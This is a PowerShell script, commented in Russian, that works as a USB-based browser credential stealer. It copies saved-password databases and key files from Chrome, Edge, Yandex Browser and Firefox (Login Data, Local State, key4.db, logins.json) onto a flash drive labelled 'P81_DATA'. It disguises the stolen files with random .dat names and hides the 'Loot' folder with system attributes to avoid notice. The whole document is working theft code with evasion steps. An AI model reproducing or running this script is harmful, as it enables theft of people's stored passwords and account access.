$v = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter
if (!$v) { exit }

# Создаем папку под видом системного кэша
$dst = "$($v):\Loot\System_$(Get-Random -Min 1000 -Max 9999)"
[System.IO.Directory]::CreateDirectory($dst) | Out-Null

# Маскировка расширения (вместо .db или .json)
$ext = ".dat"

# Список целей (пути относительно LocalAppData)
$targets = @(
    "Google\Chrome\User Data",
    "Microsoft\Edge\User Data",
    "Yandex\YandexBrowser\User Data"
)

# 1. Сбор Chromium (без Copy-Item)
foreach ($t in $targets) {
    $p = Join-Path $env:LOCALAPPDATA $t
    if (Test-Path $p) {
        Get-ChildItem -Path $p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $fn = "$(Get-Random -Min 10000 -Max 99999)$ext"
            # Используем нативный метод .NET для копирования (тише, чем PowerShell)
            [System.IO.File]::Copy($_.FullName, (Join-Path $dst $fn), $true)
        }
        # Забираем Local State для ключей
        $ls = Join-Path $p "Local State"
        if (Test-Path $ls) { 
            [System.IO.File]::Copy($ls, (Join-Path $dst "state_$(Get-Random)$ext"), $true)
        }
    }
}

# 2. Сбор Firefox
$ff = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    Get-ChildItem -Path $ff -Recurse -Include "key4.db","logins.json" -ErrorAction SilentlyContinue | ForEach-Object {
        $fn = "ff_$(Get-Random)$ext"
        [System.IO.File]::Copy($_.FullName, (Join-Path $dst $fn), $true)
    }
}

# 3. Финальный штрих: скрываем папку на флешке
$folder = Get-Item $dst -Force
$folder.Attributes = 'Hidden', 'System'
exit
